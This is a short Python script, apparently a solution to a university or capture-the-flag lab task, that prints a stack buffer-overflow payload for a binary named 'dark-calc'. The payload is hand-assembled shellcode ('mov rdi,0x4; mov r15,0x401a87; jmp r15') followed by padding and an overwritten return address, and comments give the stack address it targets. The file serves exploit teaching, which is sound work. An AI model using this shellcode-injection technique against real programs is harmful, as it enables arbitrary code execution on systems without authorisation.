#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"\xBF\x04\x00\x00\x00\x49\xC7\xC7\x87\x1A\x40\x00\x41\xFF\xE7ABCDEFGHI\xd0\x0f\x80\x00\x10\x72\x00"

# absolute stack pos of the beginning of the string: $rsp = 0x0000721000800fd0
# mov rdi,0x4
# mov r15,0x401a87
# jmp r15

sys.stdout.buffer.write(payload)
